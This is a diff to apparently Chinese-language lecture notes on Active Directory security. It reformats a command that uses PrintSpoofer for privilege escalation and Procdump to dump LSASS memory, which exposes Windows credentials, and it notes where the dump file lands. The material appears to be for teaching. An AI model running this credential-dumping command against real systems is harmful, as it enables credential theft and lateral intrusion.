@@ -23,7 +23,10 @@ Lecture Video: [2022/05/04 AD 安全1](https://youtu.be/Cv2gNQkDM8Q?si=l1na5hFGp
 #### 方法二
 如果沒有GUI的話，也可以考慮直接使用[Procdump](https://docs.microsoft.com/zh-tw/sysinternals/downloads/procdump)，當然你必須要取得足夠的權限，要不就是用前面提到的IIS提權執行指令，不然就直接切換administrator帳戶，我是用前者
 
-Command: `c:\tools\PrintSpoofer64.exe -c "c:\windows\system32\cmd.exe /c c:\tools\Procdump\procdump.exe -accepteula -ma lsass.exe lsass.dmp > c:\inetpub\wwwroot\tmp.txt"`
+Command: 
+```bash
+c:\tools\PrintSpoofer64.exe -c "c:\windows\system32\cmd.exe /c c:\tools\Procdump\procdump.exe -accepteula -ma lsass.exe lsass.dmp > c:\inetpub\wwwroot\tmp.txt"
+```
 ![](https://hackmd.io/_uploads/HJXt8mN0h.png)
 可以看到它放在`C:\Windows\system32\lsass.dmp`中
 
